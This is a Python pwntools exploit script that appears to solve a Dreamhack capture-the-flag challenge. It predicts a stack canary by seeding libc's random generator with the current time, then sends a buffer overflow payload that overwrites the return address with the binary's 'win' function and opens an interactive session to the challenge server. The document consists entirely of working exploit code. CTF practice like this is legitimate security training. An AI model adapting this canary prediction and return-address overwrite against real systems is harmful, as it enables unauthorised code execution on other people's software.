from pwn import *
from ctypes import *

context.log_level="debug"

log = lambda x,y : print(f"[+] {x}: {y}")

libc = CDLL('./libc.so.6')

libc.srand(libc.time(0))

canary = 0
for i in range(8):
	canary = canary << 8 | (libc.rand() & 0xFF)

#p = process("./prob")
p = remote("host1.dreamhack.games", 17198)
e = ELF("./prob")

win = e.symbols['win']
log("win addr", hex(win))
log("canary", hex(canary))

payload = b"A"*0x10
payload += p64(canary)
payload += b"B"*0x8
payload += b"C"*0x8
payload += p64(win+0x8)
p.recvuntil(b"input your data: ")

p.send(payload)

p.interactive()
